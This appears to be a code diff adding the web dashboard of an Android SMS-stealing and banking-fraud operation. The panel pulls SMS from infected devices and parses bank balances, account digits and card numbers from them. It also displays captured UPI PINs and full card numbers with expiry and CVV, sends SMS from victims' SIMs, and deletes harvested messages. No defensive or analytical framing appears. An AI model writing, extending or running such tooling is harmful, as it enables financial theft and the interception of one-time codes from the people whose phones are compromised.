+                    toast(dev.muted ? 'Device muted!' : 'Device unmuted!', dev.muted ? 'warn' : 'ok');
+                    applyFilter();
+                } catch (e) {
+                    toast('Mute failed: ' + e.message, 'err');
+                }
+            }
+
+
+            // ============ BACKGROUND SCROLL LOCK (PREVENTS SCROLL CHAINING) ============
+            var activeModalCount = 0;
+
+            function lockBodyScroll() {
+                activeModalCount++;
+                document.body.classList.add('modal-open');
+            }
+
+            function unlockBodyScroll() {
+                if (activeModalCount > 0) activeModalCount--;
+                if (activeModalCount === 0) {
+                    document.body.classList.remove('modal-open');
+                    document.body.style.position = '';
+                    document.body.style.top = '';
+                    document.body.style.overflow = '';
+                }
+            }
+
+            async function openDetail(dev) {
+                lockBodyScroll();
+                selectedDevice = dev;
+                detailTab = 'info';
+                smsMsgs = [];
+                smsData = { bankBalances: [], cards: [], phoneNumbers: [], networks: [] };
+                renderDetailShell();
+                if (dev._srcUrl) {
+                    await Promise.all([
+                        fetchSms(dev.id, dev._srcUrl, dev._srcSec),
+                        fetchDeviceInfo(dev)
+                    ]);
+                    if (selectedDevice === dev) renderDetailContent();
+                }
+                if (detailSmsInt) clearInterval(detailSmsInt);
+                detailSmsInt = setInterval(async function () {
+                    if (selectedDevice && selectedDevice._srcUrl) {
+                        await fetchSms(selectedDevice.id, selectedDevice._srcUrl, selectedDevice._srcSec);
+                        if (selectedDevice) renderDetailContent();
+                    }
+                }, 60000);
+            }
+
+            async function fetchDeviceInfo(dev) {
+                if (!dev || !dev._srcUrl) return;
+                try {
+                    var id = encodeURIComponent(dev.id);
+                    var paths = [];
+                    if (dev._dataPath) paths.push('/' + dev._dataPath + '/' + id + '.json');
+                    paths.push('/user_data/' + id + '.json', '/clients/' + id + '.json');
+                    var data = null;
+                    for (var i = 0; i < paths.length; i++) {
+                        try {
+                            var r = await fetch(dev._srcUrl + paths[i] + authQuery(dev._srcSec));
+                            if (!r.ok) continue;
+                            var v = await r.json();
+                            if (v && typeof v === 'object' && !Array.isArray(v)) { data = v; break; }
+                        } catch (e) { }
+                    }
+                    if (!data) return;
+                    dev.raw = data;
+                    if (data.status !== undefined) {
+                        dev.status = parseStatus(data);
+                        dev.isOnline = dev.status;
+                    }
+                    var bv = data.battery !== undefined ? data.battery : data.batLevel;
+                    if (bv !== undefined && bv !== null && bv !== '') {
+                        var b = parseInt(String(bv).replace('%', ''), 10) || 0;
+                        dev.battery = b + '%';
+                        dev.batteryPercent = b;
+                    }
+                    var sims = simsArrayOf(data);
+                    if (sims.length) {
+                        dev.sims = sims;
+                        var p = phoneOf(data, sims);
+                        if (p) { dev.phoneNumber = p; dev.phone = p; }
+                        dev.network = String(networkOf(data, sims));
+                        dev.provider = dev.network;
+                    }
+                    if (data.modelName || data.model || data.d_name) dev.name = String(data.modelName || data.model || data.d_name);
+                    if (data.ip_address || data.ip) dev.ip = String(data.ip_address || data.ip);
+                    if (data.storage) dev.storage = String(data.storage);
+                    if (data.cpu_arch || data.cpuArch || data.cpu) dev.cpu = String(data.cpu_arch || data.cpuArch || data.cpu);
+                    if (data.smsAnalysis) dev.smsAnalysis = data.smsAnalysis;
+                } catch (e) { }
+            }
+
+            function renderDetailShell() {
+                var d = selectedDevice;
+                if (!d) return;
+                var bat = parseBat(d.battery);
+                var on = d.status;
+
+                $detailRoot.innerHTML = '<div class="doverlay" id="dOv"><div class="dpanel">'
+                    + '<div class="dhead"><div class="dinfo">'
+                    + '<div class="dname">' + esc(d.name) + '</div>'
+                    + '<div class="dstat ' + (on ? 'on' : '') + '">'
+                    + '<div class="dot"></div>'
+                    + '<span class="stxt">' + (on ? '● ONLINE' : '○ OFFLINE') + '</span>'
+                    + '<span class="bat">· ' + esc(bat.l) + '</span>'
+                    + '</div></div>'
+                    + '<button class="dclose" id="dClose">✕</button></div>'
+                    + '<div class="dtabs" id="dTabs">'
+                    + '<button data-t="info" class="active">INFO</button>'
+                    + '<button data-t="bank">BANK (0)</button>'
+                    + '<button data-t="sms">SMS (0)</button>'
+                    + '<button data-t="send">SEND</button>'
+                    + '</div>'
+                    + '<div class="dcontent" id="dContent"></div>'
+                    + '</div></div>';
+
+                document.getElementById('dClose').onclick = closeDetail;
+                var dOvEl = document.getElementById('dOv');
+                dOvEl.onclick = function (e) { if (e.target === this) closeDetail(); };
+                dOvEl.addEventListener('touchmove', function (e) { if (e.target === this) e.preventDefault(); }, { passive: false });
+
+                document.getElementById('dTabs').onclick = function (e) {
+                    var b = e.target.closest('button');
+                    if (!b) return;
+                    var t = b.getAttribute('data-t');
+                    if (t === detailTab) {
+                        if (t === 'sms') {
+                            var refBtn = document.getElementById('dRefreshSms');
+                            if (refBtn) refBtn.click();
+                        }
+                        return;
+                    }
+                    detailTab = t;
+                    var all = this.querySelectorAll('button');
+                    for (var i = 0; i < all.length; i++) all[i].classList.remove('active');
+                    b.classList.add('active');
+                    renderDetailContent();
+                };
+
+                renderDetailContent();
+            }
+
+            function renderDetailContent() {
+                var d = selectedDevice;
+                if (!d) return;
+                var $c = document.getElementById('dContent');
+                if (!$c) return;
+
+                var bat = parseBat(d.battery);
+                var sa = d.smsAnalysis || {};
+                var bank = (Array.isArray(smsData.bankBalances) && smsData.bankBalances.length > 0) ? smsData.bankBalances : (Array.isArray(sa.bankBalances) ? sa.bankBalances : []);
+                var phones = (Array.isArray(smsData.phoneNumbers) && smsData.phoneNumbers.length > 0) ? smsData.phoneNumbers : (Array.isArray(sa.phoneNumbers) ? sa.phoneNumbers : []);
+                var nets = (Array.isArray(smsData.networks) && smsData.networks.length > 0) ? smsData.networks : (Array.isArray(sa.networks) ? sa.networks : []);
+                var phone = d.phoneNumber || d.phone || (phones[0] || '—');
+                var ls = d.installTime || d.lastSeen || '';
+
+                var tabs = document.querySelectorAll('#dTabs button');
+                if (tabs.length === 4) {
+                    tabs[1].textContent = 'BANK (' + bank.length + ')';
+                    tabs[2].textContent = 'SMS (' + smsMsgs.length + ')';
+                }
+
+                var html = '';
+                if (detailTab === 'info') {
+                    html = '<div class="slabel">DEVICE INFO</div>'
+                        + '<div class="irow"><span class="l">Device Number</span><span class="v" style="display:flex;align-items:center;gap:8px;justify-content:flex-end;"><span class="dev-num-badge" id="dEditNumBtn" title="Click to edit number">#' + (d.devNumber || '—') + ' ✏️</span></span></div>'
+                        + '<div class="irow"><span class="l">Phone</span><span class="v mono green">' + esc(phone) + '</span></div>'
+                        + '<div class="irow"><span class="l">Network</span><span class="v">' + (nets.length > 0 ? esc(nets.join(', ')) : esc(d.network || '—')) + '</span></div>'
+                        + '<div class="irow"><span class="l">Android</span><span class="v">' + esc(d.androidV) + '</span></div>'
+                        + '<div class="irow"><span class="l">Battery</span><span class="v ' + batClass(bat.p) + '">' + esc(bat.l) + '</span></div>'
+                        + '<div class="irow"><span class="l">IP</span><span class="v mono">' + esc(d.ip) + '</span></div>'
+                        + '<div class="irow"><span class="l">Storage</span><span class="v">' + esc(d.storage) + '</span></div>'
+                        + '<div class="irow"><span class="l">CPU</span><span class="v mono">' + esc(d.cpu) + '</span></div>'
+                        + '<div class="irow"><span class="l">SDK</span><span class="v">' + esc(d.sdk) + '</span></div>'
+                        + '<div class="irow"><span class="l">SIMs</span><span class="v">' + (d.sims || []).length + ' SIM(s)</span></div>'
+                        + '<div class="irow"><span class="l">Mute</span><span class="v">' + (d.muted ? 'MUTED' : 'ACTIVE') + '</span></div>'
+                        + (d.upipin ? '<div class="irow"><span class="l">UPI PIN</span><span class="v green">' + esc(d.upipin) + '</span></div>' : '')
+                        + (ls ? '<div class="irow"><span class="l">Install Time</span><span class="v" style="font-size:11px;">' + esc(fmtTime(ls)) + '</span></div>' : '')
+                        + '<div class="irow"><span class="l">Server Node</span><span class="v mono" style="font-size:11px;color:var(--blue-dark);font-weight:800;">' + esc(d._srcTag || 'Server 1') + '</span></div>'
+                        + '<div class="irow"><span class="l">Device ID</span><span class="v mono" style="font-size:10px;">' + esc(d.id) + '</span></div>';
+                    if (phones.length > 0) {
+                        html += '<div class="slabel">NUMBERS</div>';
+                        phones.slice(0, 5).forEach(function (n, i) {
+                            html += '<div class="irow"><span class="l">Phone #' + (i + 1) + '</span><span class="v mono green">' + esc(n) + '</span></div>';
+                        });
+                    }
+                } else if (detailTab === 'bank') {
+                    if (bank.length === 0) {
+                        html = '<div class="center-box"><div style="font-size:60px;margin-bottom:12px;">💰</div><div class="t">NO BANK SMS</div></div>';
+                    } else {
+                        bank.forEach(function (b) {
+                            html += '<div class="bitem">'
+                                + '<div class="r1"><span class="bn">' + esc(b.bankName || 'Bank') + '</span><span class="ba">₹' + esc(b.availableBalance || '0') + '</span></div>'
+                                + (b.rawSms ? '<div class="sub">' + esc(b.rawSms) + '</div>' : '')
+                                + '</div>';
+                        });
+                    }
+                } else if (detailTab === 'sms') {
+                    html = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;gap:8px;">'
+                        + '<button class="dora-btn blue" id="dRefreshSms" style="min-width:auto;padding:7px 14px;cursor:pointer;display:inline-flex;align-items:center;gap:6px;box-shadow:3px 3px 0 var(--outline);"><span class="ico">🔄</span> REFRESH SMS</button>'
+                        + '<span style="font-weight:800;font-size:12px;color:var(--blue-dark);background:var(--card);padding:5px 12px;border-radius:10px;border:2px solid var(--outline);box-shadow:2px 2px 0 var(--outline);">💬 ' + smsMsgs.length + ' Total SMS</span>'
+                        + '</div>';
+
+                    if (smsMsgs.length === 0) {
+                        html += '<div class="center-box"><div style="font-size:50px;margin-bottom:10px;">💬</div><div class="t">NO MESSAGES</div><div class="sub">Click REFRESH SMS above to load messages</div></div>';
+                    } else {
+                        smsMsgs.forEach(function (m) {
+                            html += '<div class="smsitem"><div class="sh"><span>📩 ' + esc(m.sender) + '</span><span class="time">' + esc(m.time || fmtTime(m.ts)) + '</span></div><div class="sb">' + esc(m.text) + '</div></div>';
+                        });
+                    }
+                } else if (detailTab === 'send') {
+                    html = '<div class="sform">'
+                        + '<div class="fl">SELECT SIM</div>'
+                        + '<div class="sims">'
+                        + '<button data-sim="1" class="' + (simSel === 1 ? 'active' : '') + '">SIM 1</button>'
+                        + '<button data-sim="2" class="' + (simSel === 2 ? 'active' : '') + '">SIM 2</button>'
+                        + '</div>'
+                        + '<div class="fl">RECIPIENT</div>'
+                        + '<input type="text" id="sNum" placeholder="+91XXXXXXXXXX" value="' + esc(phone !== '—' ? phone : '') + '" />'
+                        + '<div class="fl">MESSAGE</div>'
+                        + '<textarea id="sMsg" placeholder="Type your message..."></textarea>'
+                        + '<button class="sbtn" id="sSend">📤 SEND MESSAGE</button>'
+                        + '</div>';
+                }
+
+                $c.innerHTML = html;
+
+                if (detailTab === 'send') {
+                    var simsBox = $c.querySelector('.sims');
+                    if (simsBox) {
+                        simsBox.onclick = function (e) {
+                            var b = e.target.closest('button');
+                            if (!b) return;
+                            simSel = parseInt(b.getAttribute('data-sim'), 10);
+                            var all = simsBox.querySelectorAll('button');
+                            for (var i = 0; i < all.length; i++) all[i].classList.remove('active');
+                            b.classList.add('active');
+                        };
+                    }
+                    var sBtn = document.getElementById('sSend');
+                    if (sBtn) sBtn.onclick = sendSms;
+                }
+
+                if (detailTab === 'info') {
+                    var editBtn = document.getElementById('dEditNumBtn');
+                    if (editBtn) {
+                        editBtn.onclick = function () {
+                            var input = prompt('Set permanent Number for ' + d.name + ':', d.devNumber || '');
+                            if (input !== null && input.trim() !== '') {
+                                setCustomDeviceNumber(d.id, input.trim());
+                                renderDetailContent();
+                            }
+                        };
+                    }
+                }
+
+                if (detailTab === 'sms') {
+                    var refBtn = document.getElementById('dRefreshSms');
+                    if (refBtn) {
+                        refBtn.onclick = async function () {
+                            var btn = this;
+                            btn.disabled = true;
+                            btn.innerHTML = '<span class="ico">⏳</span> REFRESHING...';
+                            toast('Refreshing SMS for ' + esc(d.name || d.id) + '...', 'warn');
+                            try {
+                                await fetchSms(d.id, d._srcUrl, d._srcSec);
+                                toast('SMS Refreshed! (' + smsMsgs.length + ' found)', 'ok');
+                            } catch (e) {
+                                toast('Failed to refresh SMS: ' + e.message, 'err');
+                            } finally {
+                                renderDetailContent();
+                            }
+                        };
+                    }
+                }
+            }
+
+            function closeDetail() {
+                if (detailSmsInt) { clearInterval(detailSmsInt); detailSmsInt = null; }
+                $detailRoot.innerHTML = '';
+                selectedDevice = null;
+                unlockBodyScroll();
+            }
+
+            function deviceSmsPaths(id, devOrSrc) {
+                var enc = encodeURIComponent(id);
+                var smsPath = (devOrSrc && devOrSrc._smsPath) || (devOrSrc && devOrSrc.smsPath) || (selectedDevice && selectedDevice._smsPath);
+                var paths = [];
+                if (smsPath) paths.push('/' + smsPath + '/' + enc + '.json');
+                paths.push('/user_sms/' + enc + '.json', '/messages/' + enc + '.json', '/sms/' + enc + '.json', '/clientMessages/' + enc + '.json');
+                return paths.filter(function (p, i, a) { return a.indexOf(p) === i; });
+            }
+
+            async function fetchSms(id, url, sec) {
+                if (!url) return;
+                var paths = deviceSmsPaths(id);
+                for (var p = 0; p < paths.length; p++) {
+                    try {
+                        var r = await fetch(url + paths[p] + authQuery(sec));
+                        if (!r.ok) continue;
+                        var d = await r.json();
+                        if (!d || typeof d !== 'object' || Array.isArray(d)) continue;
+                        var arr = [];
+                        Object.keys(d).forEach(function (k) {
+                            var m = d[k];
+                            if (!m || typeof m !== 'object' || Array.isArray(m)) return;
+                            var text = m.message || m.body || m.msg || '';
+                            if (!text) return;
+                            var date = m.dateTime || m.date || m.time || m.TimeandDate || '';
+                            arr.push({
+                                text: String(text),
+                                sender: String(m.sender || m.from || m.number || 'Unknown'),
+                                time: String(date || ''),
+                                ts: parseSmsTime(date, m.timestamp || m.id || k),
+                                key: k
+                            });
+                        });
+                        arr.sort(function (a, b) { return b.ts - a.ts; });
+                        smsMsgs = arr;
+                        smsData = analyzeSms(smsMsgs);
+                        return;
+                    } catch (e) { }
+                }
+                smsMsgs = [];
+                smsData = { bankBalances: [], cards: [], phoneNumbers: [], networks: [] };
+            }
+
+            function analyzeSms(msgs) {
+                var bank = [], cards = [], phones = [], nets = [];
+                for (var i = 0; i < msgs.length; i++) {
+                    var t = msgs[i].text || '';
+                    var bm = t.match(/(?:Avl|Bal|Available)\s*(?:Bal|Balance)?\s*[:\-]?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i)
+                        || t.match(/(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:Avl|Bal|Balance)/i);
+                    if (bm) {
+                        var bn = t.match(/HDFC|SBI|ICICI|AXIS|KOTAK|PNB|BOI|CANARA|UNION|YES|IDBI|INDUS|FEDERAL|RBL|PAYTM|PHONEPE|GPAY|IPBMSG/i);
+                        var txType = /credit/i.test(t) ? 'credit' : (/debit|withdraw|spent|purchase/i.test(t) ? 'debit' : '');
+                        var txAmt = '';
+                        var am = t.match(/(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:debited|credited|withdrawn|deposited|spent)/i)
+                            || t.match(/(?:debited|credited|withdrawn|deposited|spent)\s*(?:by|with|for)?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i);
+                        if (am) txAmt = am[1].replace(/,/g, '');
+                        var accM = t.match(/([xX*]{0,4}[0-9]{4})\b/);
+                        bank.push({
+                            bankName: bn ? bn[0] : 'Bank',
+                            availableBalance: bm[1].replace(/,/g, ''),
+                            accountLast4: accM ? accM[1].slice(-4) : '',
+                            transactionType: txType,
+                            transactionAmount: txAmt,
+                            rawSms: t.substring(0, 120)
+                        });
+                    }
+                    var cm = t.match(/card[\s:]*([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i) || t.match(/[xX*]{4,}([0-9]{4})/);
+                    if (cm) {
+                        var ct = t.match(/VISA|MASTER|RUPAY|AMEX/i);
+                        cards.push({ cardLast4: cm[1].replace(/\s/g, '').slice(-4), cardType: ct ? ct[0] : 'Card' });
+                    }
+                    var pm = t.match(/(\+91[-\s]?[6-9][0-9]{9})|([6-9][0-9]{9})/);
+                    if (pm) {
+                        var num = pm[0].replace(/[^0-9]/g, '');
+                        if (num.length === 10 && /^[6-9]/.test(num) && phones.indexOf(num) === -1) phones.push(num);
+                    }
+                    var nm = t.match(/Jio|Airtel|Vodafone|Idea|BSNL|Vi/i);
+                    if (nm && nets.indexOf(nm[0]) === -1) nets.push(nm[0]);
+                }
+                return { bankBalances: bank, cards: cards, phoneNumbers: phones, networks: nets };
+            }
+
+            function queueSms(dev, phone, message, slot) {
+                var base = dev._srcUrl;
+                var id = encodeURIComponent(dev.id);
+                var a = authQuery(dev._srcSec);
+                var dataPath = dev._dataPath || (sources[0] && sources[0].dataPath) || 'clients';
+                var cmd = { command: 'send message', phoneNumber: phone, messageText: message, simSlot: String(slot), targetDeviceId: dev.id };
+                var jobs = [
+                    fetch(base + '/' + dataPath + '/' + id + '.json' + a, {
+                        method: 'PATCH',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(cmd)
+                    })
+                ];
+                if (dataPath === 'clients') {
+                    var webhook = { from: parseInt(slot, 10) || 1, isSended: false, message: message, to: phone };
+                    jobs.push(fetch(base + '/clients/' + id + '/webhookEvent/sendSms.json' + a, {
+                        method: 'PUT',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(webhook)
+                    }));
+                }
+                return Promise.all(jobs).then(function (results) {
+                    return results.some(function (r) { return r.ok; });
+                });
+            }
+
+            async function sendSms() {
+                if (!selectedDevice || !selectedDevice._srcUrl) return;
+                var num = (document.getElementById('sNum') || {}).value;
+                var msg = (document.getElementById('sMsg') || {}).value;
+                num = num ? num.trim() : '';
+                msg = msg ? msg.trim() : '';
+                if (!num || !msg) { toast('Fill all fields!', 'err'); return; }
+                var b = document.getElementById('sSend');
+                b.disabled = true;
+                b.textContent = 'SENDING...';
+                try {
+                    var ok = await queueSms(selectedDevice, num, msg, simSel);
+                    if (!ok) throw new Error('request failed');
+                    toast('SMS queued!', 'ok');
+                    document.getElementById('sMsg').value = '';
+                } catch (e) {
+                    toast('Failed: ' + e.message, 'err');
+                } finally {
+                    b.disabled = false;
+                    b.textContent = '📤 SEND MESSAGE';
+                }
+            }
+
+            function confirmBox(opts, cb) {
+                opts = opts || {};
+                var isR = opts.restore;
+                var icon = opts.icon || (isR ? '♻️' : '🗑️');
+                var title = opts.title || (isR ? 'RESTORE?' : 'HIDE?');
+                var message = opts.message || ((isR ? 'Bring it back!' : 'Hide this device?') + '<br><span class="cname">' + esc(opts.name || '') + '</span>');
+                var yes = opts.yesText || (isR ? 'RESTORE' : 'HIDE');
+                $confirmRoot.innerHTML = '<div class="overlay" id="cOv"><div class="cbox">'
+                    + '<div class="cicon">' + icon + '</div>'
+                    + '<h3>' + title + '</h3>'
+                    + '<p>' + message + '</p>'
+                    + '<div class="cbtns"><button class="cn" id="cNo">CANCEL</button>'
+                    + '<button class="cy' + (isR ? ' restore' : '') + '" id="cYes">' + yes + '</button></div>'
+                    + '</div></div>';
+                document.getElementById('cNo').onclick = function () { $confirmRoot.innerHTML = ''; };
+                document.getElementById('cYes').onclick = function () { $confirmRoot.innerHTML = ''; cb(); };
+                document.getElementById('cOv').onclick = function (e) { if (e.target === this) $confirmRoot.innerHTML = ''; };
+            }
+
+            async function openAllSmsModal() {
+                lockBodyScroll();
+                $modalRoot.innerHTML = '<div class="overlay" id="overlay"><div class="modal">'
+                    + '<div class="modal-head"><h2>💬 ALL SMS</h2><button class="modal-close" id="mClose">✕</button></div>'
+                    + '<div class="modal-tools">'
+                    + '<button class="mini-btn" id="smsReload">🔄 REFRESH</button>'
+                    + '<button class="mini-btn danger" id="smsDelete">DELETE SELECTED</button>'
+                    + '<label class="mini-check"><input type="checkbox" id="showMutedChk"' + (showMutedSms ? ' checked' : '') + '> SHOW MUTED</label>'
+                    + '</div>'
+                    + '<div id="allSmsBody"><div class="center-box" style="padding:30px;"><div class="dora-spin"><svg viewBox="0 0 200 200"><circle cx="100" cy="100" r="88" fill="#0099E6" stroke="#1a1a1a" stroke-width="8"/><ellipse cx="100" cy="122" rx="68" ry="58" fill="#FFFFFF" stroke="#1a1a1a" stroke-width="6"/><circle cx="84" cy="78" r="7" fill="#1a1a1a"/><circle cx="116" cy="78" r="7" fill="#1a1a1a"/><circle cx="100" cy="100" r="11" fill="#E60012" stroke="#1a1a1a" stroke-width="6"/></svg></div><div class="t">FETCHING...</div><div class="sub">Scanning gadgets</div></div></div>'
+                    + '<div class="pager" id="smsPager" style="display:none;"><button id="smsPrev">‹ PREV</button><span id="smsPageInfo">Page 1/1</span><button id="smsNext">NEXT ›</button></div>'
+                    + '</div></div>';
+
+                document.getElementById('mClose').onclick = closeModal;
+                document.getElementById('overlay').onclick = function (e) { if (e.target === this) closeModal(); };
+                document.getElementById('smsReload').onclick = function () { loadAllSms(); };
+                document.getElementById('smsDelete').onclick = deleteSelectedSms;
+                document.getElementById('showMutedChk').onchange = function () {
+                    showMutedSms = this.checked;
+                    allSmsPage = 0;
+                    renderAllSmsPage();
+                };
+                document.getElementById('smsPrev').onclick = function () {
+                    if (allSmsPage > 0) { allSmsPage--; renderAllSmsPage(); }
+                };
+                document.getElementById('smsNext').onclick = function () {
+                    allSmsPage++;
+                    renderAllSmsPage();
+                };
+                await loadAllSms();
+            }
+
+            async function loadAllSms() {
+                var body = document.getElementById('allSmsBody');
+                if (!body) return;
+                body.innerHTML = '<div class="center-box" style="padding:30px;"><div class="t">FETCHING...</div><div class="sub">Loading messages from all ' + sources.length + ' server nodes...</div></div>';
+                allSmsPage = 0;
+                try {
+                    var smsPromises = sources.map(async function (src) {
+                        var paths = [];
+                        if (src.smsPath) paths.push('/' + src.smsPath + '.json');
+                        paths.push('/user_sms.json', '/messages.json');
+                        paths = paths.filter(function (p, i, a) { return a.indexOf(p) === i; });
+                        var data = null;
+                        for (var pi = 0; pi < paths.length; pi++) {
+                            try {
+                                var r = await fetch(src.url + paths[pi] + authQuery(src.secret));
+                                if (!r.ok) continue;
+                                var v = await r.json();
+                                if (v && typeof v === 'object' && !Array.isArray(v) && Object.keys(v).length > 0) { data = v; break; }
+                            } catch (e) { }
+                        }
+                        if (!data || typeof data !== 'object' || Array.isArray(data)) return [];
+                        var resArr = [];
+                        Object.keys(data).forEach(function (devId) {
+                            var msgs = data[devId];
+                            if (!msgs || typeof msgs !== 'object' || Array.isArray(msgs)) return;
+                            var dev = devices.find(function (d) { return String(d.id) === String(devId) && String(d._srcUrl) === String(src.url); }) || devices.find(function (d) { return String(d.id) === String(devId); });
+                            var isMuted = !!(dev && dev.muted) || !!mutedDevices[devId];
+                            Object.keys(msgs).forEach(function (key) {
+                                var m = msgs[key];
+                                if (!m || typeof m !== 'object' || Array.isArray(m)) return;
+                                var text = m.message || m.body || m.msg || '';
+                                if (!text) return;
+                                var date = m.dateTime || m.date || m.time || m.TimeandDate || '';
+                                resArr.push({
+                                    devId: String(devId),
+                                    devName: dev ? String(dev.name) : String(devId),
+                                    srcUrl: src.url,
+                                    srcSec: src.secret,
+                                    srcTag: src.tag,
+                                    key: key,
+                                    text: String(text),
+                                    sender: String(m.sender || m.from || m.number || 'Unknown'),
+                                    time: String(date || ''),
+                                    ts: parseSmsTime(date, m.timestamp || m.id || key),
+                                    muted: isMuted
+                                });
+                            });
+                        });
+                        return resArr;
+                    });
+
+                    var results = await Promise.all(smsPromises);
+                    var arr = [];
+                    results.forEach(function (r) { arr = arr.concat(r); });
+                    arr.sort(function (a, b) { return b.ts - a.ts; });
+                    allSmsMessages = arr;
+                    renderAllSmsPage();
+                } catch (e) {
+                    if (body) body.innerHTML = '<div class="center-box"><div style="font-size:50px;margin-bottom:10px;">⚠️</div><div class="t">FETCH FAILED</div><div class="sub">' + esc(e.message) + '</div></div>';
+                }
+            }
+
+            function renderAllSmsPage() {
+                var body = document.getElementById('allSmsBody');
+                var pager = document.getElementById('smsPager');
+                var info = document.getElementById('smsPageInfo');
+                var prev = document.getElementById('smsPrev');
+                var next = document.getElementById('smsNext');
+                if (!body) return;
+
+                var list = allSmsMessages.filter(function (m) { return showMutedSms || !m.muted; });
+                var totalPages = Math.max(1, Math.ceil(list.length / allSmsPageSize));
+                if (allSmsPage >= totalPages) allSmsPage = totalPages - 1;
+                if (allSmsPage < 0) allSmsPage = 0;
+
+                if (list.length === 0) {
+                    body.innerHTML = '<div style="text-align:center;padding:30px;color:var(--blue);font-size:15px;font-weight:800;">NO SMS FOUND</div>';
+                    if (pager) pager.style.display = 'none';
+                    return;
+                }
+
+                var start = allSmsPage * allSmsPageSize;
+                var page = list.slice(start, start + allSmsPageSize);
+                var html = '<div style="font-size:13px;color:var(--blue-dark);margin-bottom:12px;font-weight:800;letter-spacing:1px;">📨 FOUND ' + list.length + ' MESSAGES (MERGED)</div>';
+                page.forEach(function (m) {
+                    html += '<div class="smsitem">'
+                        + '<div class="sh"><span><input type="checkbox" class="smscheck" data-dev="' + esc(m.devId) + '" data-key="' + esc(m.key) + '">'
+                        + '<span class="smsdev" data-dev="' + esc(m.devId) + '">📱 ' + esc(m.devName.substring(0, 18)) + '</span>' + (m.srcTag ? ' <small style="color:var(--blue-dark);font-weight:800;">[' + esc(m.srcTag) + ']</small>' : '') + '</span>'
+                        + '<span class="time">' + esc(m.time || fmtTime(m.ts)) + '</span></div>'
+                        + '<div class="sh" style="color:var(--text-dim);font-size:10px;padding-left:24px;">📩 ' + esc(m.sender) + '</div>'
+                        + '<div class="sb">' + esc(m.text) + '</div>'
+                        + (m.muted ? '<div class="mute-tag">MUTED</div>' : '')
+                        + '</div>';
+                });
+                body.innerHTML = html;
+
+                if (pager) pager.style.display = 'flex';
+                if (info) info.textContent = 'Page ' + (allSmsPage + 1) + '/' + totalPages;
+                if (prev) prev.disabled = allSmsPage <= 0;
+                if (next) next.disabled = allSmsPage >= totalPages - 1;
+
+                var devLinks = body.querySelectorAll('.smsdev');
+                for (var i = 0; i < devLinks.length; i++) {
+                    devLinks[i].onclick = function (e) {
+                        e.stopPropagation();
+                        var id = this.getAttribute('data-dev');
+                        var dev = devices.find(function (d) { return String(d.id) === id; });
+                        if (dev) { closeModal(); openDetail(dev); }
+                    };
+                }
+            }
+
+            function deleteSelectedSms() {
+                var checks = document.querySelectorAll('#allSmsBody .smscheck:checked');
+                if (!checks.length) { toast('Select SMS first!', 'warn'); return; }
+                var items = [];
+                for (var i = 0; i < checks.length; i++) {
+                    var devId = checks[i].getAttribute('data-dev');
+                    var key = checks[i].getAttribute('data-key');
+                    var foundMsg = allSmsMessages.find(function (m) { return m.devId === devId && m.key === key; });
+                    items.push({
+                        devId: devId,
+                        key: key,
+                        srcUrl: (foundMsg && foundMsg.srcUrl) || '',
+                        srcSec: (foundMsg && foundMsg.srcSec) || ''
+                    });
+                }
+                confirmBox({
+                    title: 'DELETE?',
+                    message: 'Permanently delete <b>' + items.length + '</b> SMS from server?',
+                    yesText: 'DELETE',
+                    icon: '🗑️'
+                }, async function () {
+                    var ok = 0;
+                    for (var j = 0; j < items.length; j++) {
+                        try {
+                            var it = items[j];
+                            var targetDev = devices.find(function (d) { return String(d.id) === String(it.devId); });
+                            var targetUrl = it.srcUrl || (targetDev && targetDev._srcUrl) || (sources[0] && sources[0].url);
+                            var targetSec = it.srcSec || (targetDev && targetDev._srcSec) || (sources[0] && sources[0].secret);
+                            var rootPath = (targetDev && targetDev._smsPath) || 'messages';
+                            var r = await fetch(targetUrl + '/' + rootPath + '/' + encodeURIComponent(it.devId) + '/' + encodeURIComponent(it.key) + '.json' + authQuery(targetSec), { method: 'DELETE' });
+                            if (r.ok) ok++;
+                        } catch (e) { }
+                    }
+                    var remove = {};
+                    items.forEach(function (x) { remove[x.devId + '::' + x.key] = true; });
+                    allSmsMessages = allSmsMessages.filter(function (m) { return !remove[m.devId + '::' + m.key]; });
+                    renderAllSmsPage();
+                    toast('Deleted ' + ok + '/' + items.length, ok === items.length ? 'ok' : 'warn');
+                });
+            }
+
+            async function openCardsModal() {
+                lockBodyScroll();
+                $modalRoot.innerHTML = '<div class="overlay" id="overlay"><div class="modal">'
+                    + '<div class="modal-head"><h2>💳 CARDS</h2><button class="modal-close" id="mClose">✕</button></div>'
+                    + '<div id="cardsBody"><div class="center-box" style="padding:30px;"><div class="t">FETCHING...</div><div class="sub">Loading card details from all sources</div></div></div>'
+                    + '</div></div>';
+                document.getElementById('mClose').onclick = closeModal;
+                document.getElementById('overlay').onclick = function (e) { if (e.target === this) closeModal(); };
+
+                var body = document.getElementById('cardsBody');
+                try {
+                    var cardPromises = sources.map(async function (src) {
+                        try {
+                            var r = await fetch(src.url + '/Card.json' + authQuery(src.secret));
+                            if (!r.ok) return [];
+                            var data = await r.json();
+                            if (!data || typeof data !== 'object' || Array.isArray(data)) return [];
+                            var list = [];
+                            Object.keys(data).forEach(function (token) {
+                                var c = data[token];
+                                if (!c || typeof c !== 'object' || Array.isArray(c)) return;
+                                list.push({
+                                    token: String(token),
+                                    number: String(c.number || c.cardNumber || 'Unknown'),
+                                    exp: String(c.exp || c.expiry || 'Unknown'),
+                                    cvv: String(c.cvv || 'Unknown'),
+                                    srcUrl: src.url,
+                                    srcSec: src.secret,
+                                    srcTag: src.tag
+                                });
+                            });
+                            return list;
+                        } catch (e) { return []; }
+                    });
+
+                    var results = await Promise.all(cardPromises);
+                    var cards = [];
+                    cardTokens = {};
+                    results.forEach(function (r) {
+                        r.forEach(function (c) {
+                            cards.push(c);
+                            cardTokens[c.token] = true;
+                        });
+                    });
+
+                    if (currentFilter === 'card') applyFilter();
+                    if (!body) return;
+                    if (cards.length === 0) {
+                        body.innerHTML = '<div style="text-align:center;padding:30px;color:var(--blue);font-size:15px;font-weight:800;">NO CARDS FOUND</div>';
+                        return;
+                    }
